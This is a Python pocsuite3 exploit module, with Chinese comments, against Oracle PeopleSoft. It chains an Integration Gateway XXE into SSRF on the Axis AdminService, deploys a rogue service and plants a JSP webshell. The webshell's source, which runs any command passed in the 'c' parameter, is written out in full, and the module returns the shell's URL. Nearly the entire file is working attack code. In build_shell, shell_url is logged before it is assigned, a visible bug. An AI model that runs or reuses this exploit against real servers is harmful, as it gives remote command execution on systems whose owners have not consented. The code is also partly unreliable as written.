#coding=utf-8
import random
import json
import time
import os
from urllib.parse import urljoin
import urllib.parse
import re
import string
import random
import sys
import socket

from pocsuite3.lib.utils import url2ip
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger
from pocsuite3.api import POC_CATEGORY


'''
RCE的方式主要有两种：

1、 XXE to RCE  [CVE-2013-3821] Integration Gateway HttpListeningConnector XXE(8.51, 8.52, and 8.53?)
2、 反序列化    [CVE-2017-10366] RCE vulnerability in monitor service of PeopleSoft 8.54, 8.55, 8.56

'''

CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'    # 部署Axis的Service使用的类，PeopleSoft’s pspc.war包里有的，而不是Axis通用的

# shell.jsp?c=whoami
PAYLOAD = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>'

PROXY = ''  #'192.168.85.1:8087'
LOCAL_PORT = ''

class PeopleSoft_getshell(POCBase):
    vulID = 'CVE-2013-3821-CVE-2017-10366'
    appName = 'PeopleSoft'
    appVersion = '< 8.57'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = 'RCE'
    vulDate = '2021-02-22'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2021-02-22'  # 编写 PoC 的日期
    updateDate = '2021-02-22'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/VfLmgSrry28hx9xrunpp7A', 'https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce']  # 漏洞地址来源,0day不用写
    name = 'PeopleSoft getshell'  # PoC 名称
    cvss = u"高危"



    def _verify(self):
        global LOCAL_PORT
        result={}

        target_url = self.url

        host, port = url2ip(target_url, True)

        LOCAL_PORT = port



        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 




        # 进入扫描逻辑
        x = PeopleSoftRCE(target_url)

        shell_url = ''           # 默认shell的url

        try:
            x.check_all()        # 检查版本号、 site的name、Cookie中的Axis部署的端口号这些信息
            x.service_deploy()   # 部署Service
            shell_url = x.build_shell()
        except RuntimeError as e:
            logger.error(e)
        finally:    # 不管怎样，都把之前部署的Service解除掉
            x.service_undeploy()
        


        # 只要shell_url被赋予了非空的值，则认为webshell上传成功
        if '' != shell_url:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Shell_URL'] = shell_url

            return self.save_output(result)


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


class Browser:
    """Wrapper around requests.
    """

    def __init__(self, url):
        self.url = url
        self.init()

    def init(self):
        self.session = req.Session()
        self.session.proxies = {
            'http': PROXY,
            'https': PROXY
        }
        self.session.headers={'Cookie': ''}   # 某些系统需要SSO才能访问，这里填Cookie
        self.session.verify = False

    def get(self, url ,*args, **kwargs):
        return self.session.get(url=self.url + url, proxies=self.session.proxies, *args, **kwargs)

    def post(self, url, *args, **kwargs):
        return self.session.post(url=self.url + url,proxies=self.session.proxies, *args, **kwargs)

    def matches(self, r, regex):
        return re.findall(regex, r.text)


class Recon(Browser):
    """Grabs different informations about the target.
    """

    def check_all(self):
        self.site_id = None
        self.local_port = None
        self.check_version()
        self.check_site_id()
        self.check_local_infos()



    def check_version(self):    # 查看版本
        """Grabs PeopleTools' version.
        """
        self.version = None
        r = self.get('/PSEMHUB/hub')
        m = self.matches(r, 'Registered Hosts Summary - ([0-9\.]+).</b>')

        if m:
            self.version = m[0]
            logger.info('PTools version: %s' % self.version)
        else:
            logger.error('Unable to find version')



    def check_site_id(self):  # 访问/ 其响应中的html通过正则匹配出site name/ID
        """Grabs the site ID and the local port.
        """
        if self.site_id:
            return

        r = self.get('/')
        m = self.matches(r, '/([^/]+)/signon.html')

        if not m:
            raise RuntimeError('Unable to find site ID')

        self.site_id = m[0]
        logger.info('Site ID: ' + self.site_id)



    def check_local_infos(self):
        """Uses cookies to leak hostname and local port.
        """
        if self.local_port:
            return

        r = self.get('/psp/%s/signon.html' % self.site_id)

        for c, v in self.session.cookies.items():
            if c.endswith('-PORTAL-PSJSESSIONID'):   # 这里当Set-Cookie的值有多个-分割时可能有bug。待实际环境修改此处。
                #self.local_host, self.local_port, *_ = c.split('-')
                # 端口号的位置在由-分割的字符串的倒数第三个位置
                self.local_host, self.local_port = 'localhost', c.split('-')[-3]
                logger.info('Target: %s:%s' % (self.local_host, self.local_port))
                return

        self.local_host, self.local_port = 'localhost', LOCAL_PORT
        logger.info('Target: %s:%s' % (self.local_host, self.local_port))
        #raise RuntimeError('Unable to get local hostname / port')


class AxisDeploy(Recon):
    """Uses the XXE to install Deploy, and uses its two useful methods to get
    a shell.
    """

    def init(self):
        super().init()
        self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)



    def random_string(self, size):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))



    def url_service(self, payload):
        return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
            self.local_port,
            urllib.parse.quote_plus(self.psoap(payload))
        )



    def war_path(self, name):
        # This is just a guess from the few PeopleSoft instances we audited.
        # It might be wrong.
        suffix = '.war' if self.version and self.version >= '8.50' else ''
        return './applications/peoplesoft/%s%s' % (name, suffix)



    def pxml(self, payload):    # 利用Axis的trick，将本需要POST发送的XML通过对应格式的GET请求发送出去
        """Converts an XML payload into a one-liner.
        """
        payload = payload.strip().replace('\n', ' ')
        payload = re.sub('\s+<', '<', payload, flags=re.S)
        payload = re.sub('\s+', ' ', payload, flags=re.S)
        logger.info(payload)

        return payload



    def psoap(self, payload):
        """Converts a SOAP payload into a one-liner, including the comment trick
        to allow attributes.
        """
        payload = self.pxml(payload)
        payload = '!-->%s' % payload[:-1]
        return payload



    def soap_service_deploy(self):
        """SOAP payload to deploy the service.
        """
        return """
        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s" provider="java:RPC">
                <ns1:parameter name="className" value="%s"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
        </ns1:deployment>
        """ % (self.service_name, CLASS_NAME)



    def soap_service_deploy2(self):
        """SOAP payload to deploy the service.
        """
        return """
        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
           <ns1:service name="%s" provider="java:RPC">
              <requestFlow>
                 <handler type="RandomLog"/>
             </requestFlow>
             <ns1:parameter name="className" value="java.util.Random"/>
             <ns1:parameter name="allowedMethods" value="*"/>
          </ns1:service>
          <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
             <parameter name="LogHandler.fileName" value="./applications/peoplesoft/PSOL/test1.jsp" />   
             <parameter name="LogHandler.writeToConsole" value="false" /> 
          </handler>
        </ns1:deployment>
        """ % (self.service_name)



    def soap_service_undeploy(self):
        """SOAP payload to undeploy the service.
        """
        return """
        <ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
        <ns1:service name="%s"/>
        </ns1:undeployment>
        """ % (self.service_name, )



    def xxe_ssrf(self, payload):
        """Runs the given AXIS deploy/undeploy payload through the XXE.
        """
        data = """
        <?xml version="1.0"?>
        <!DOCTYPE IBRequest [
        <!ENTITY x SYSTEM "%s">
        ]>
        <IBRequest>
           <ExternalOperationName>&x;</ExternalOperationName>
           <OperationType/>
           <From><RequestingNode/>
              <Password/>
              <OrigUser/>
              <OrigNode/>
              <OrigProcess/>
              <OrigTimeStamp/>
           </From>
           <To>
              <FinalDestination/>
              <DestinationNode/>
              <SubChannel/>
           </To>
           <ContentSections>
              <ContentSection>
                 <NonRepudiation/>
                 <MessageVersion/>
                 <Data>
                 </Data>
              </ContentSection>
           </ContentSections>
        </IBRequest>
        """ % self.url_service(payload)
        r = self.post(
            '/PSIGW/HttpListeningConnector',
            data=self.pxml(data),
            headers={
                'Content-Type': 'application/xml'
            }
        )



    def service_check(self):
        """Verifies that the service is correctly installed.
        """
        r = self.get('/pspc/services')
        return self.service_name in r.text



    def service_deploy(self):
        self.xxe_ssrf(self.soap_service_deploy())

        if not self.service_check():
            raise RuntimeError('Unable to deploy service')

        logger.info('Service deployed')



    def service_undeploy(self):
        if not self.local_port:
            return

        self.xxe_ssrf(self.soap_service_undeploy())

        if self.service_check():
            logger.info('Unable to undeploy service')
            return

        logger.info('Service undeployed')



    def service_send(self, data):
        """Send data to the Axis endpoint.
        """
        return self.post(
            '/pspc/services/%s' % self.service_name,
            data=data,
            headers={
                'SOAPAction': 'useless',    # 这个头必须带，值是什么无所谓
                'Content-Type': 'application/xml'
            }
        )



    def service_copy(self, path0, path1):
        """Copies one file to another.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:copy
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <in0 xsi:type="xsd:string">%s</in0>
            <in1 xsi:type="xsd:string">%s</in1>
        </api:copy>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (path0, path1)
        response = self.service_send(data)
        return '<ns1:copyResponse' in response.text



    def service_main(self, tmp_path, tmp_dir):
        """Writes the payload at the end of the .xml file.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s.war</item>
                <item xsi:type="xsd:string">something</item>
                <item xsi:type="xsd:string">-addToEntityReg</item>
                <item xsi:type="xsd:string"><![CDATA[%s]]></item>
            </api:in0>
        </api:main>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
        response = self.service_send(data)



    def build_shell(self):
        """Builds a SYSTEM shell.
        """
        # On versions >= 8.50, using another extension than JSP got 70 bytes
        # in return every time, for some reason.
        # Using .jsp seems to trigger caching, thus the same pivot cannot be
        # used to extract several files.
        # Again, this is just from experience, nothing confirmed
        pivot = '/%s.jsp' % self.random_string(20)
        pivot_path = self.war_path('PSOL') + pivot
        pivot_url = '/PSOL' + pivot

        # 1: Copy portletentityregistry.xml to TMP

        per = '/WEB-INF/data/portletentityregistry.xml'
        per_path = self.war_path('pspc')
        tmp_path = '../' * 20 + 'TEMP'   # 这是Windows下的情况
        tmp_path_lin = '../' * 2 + 'TEMP'  # Linux下具体的个数视情况而定？
        tmp_dir = self.random_string(20)
        tmp_per = tmp_path + '/' + tmp_dir + per
        tmp_per_lin = tmp_path_lin + '/' + tmp_dir + per

        if not self.service_copy(per_path + per, tmp_per):
            if not self.service_copy(per_path + per, tmp_per_lin):    # 默认的Windows情况不行，就改用Linux的
                raise RuntimeError('Unable to copy original XML file')

        # 2: Add JSP payload
        self.service_main(tmp_path, tmp_dir)
        self.service_main(tmp_path_lin, tmp_dir)

        # 3: Copy XML to JSP in webroot
        if not self.service_copy(tmp_per, pivot_path):
            if not self.service_copy(tmp_per_lin, pivot_path):    # 默认的Windows情况不行，就改用Linux的
                raise RuntimeError('Unable to copy modified XML file')

        logger.info('Shell URL: ' + shell_url)
        response = self.get(pivot_url)

        if response.status_code != 200:
            raise RuntimeError('Unable to access JSP shell')

        shell_url = self.url + pivot_url + '?c='    # 把命令参数放进去
        logger.info('Shell URL: ' + shell_url)

        return shell_url



class PeopleSoftRCE(AxisDeploy):
    def __init__(self, url):
        super().__init__(url)



# 注册类
register_poc(PeopleSoft_getshell)
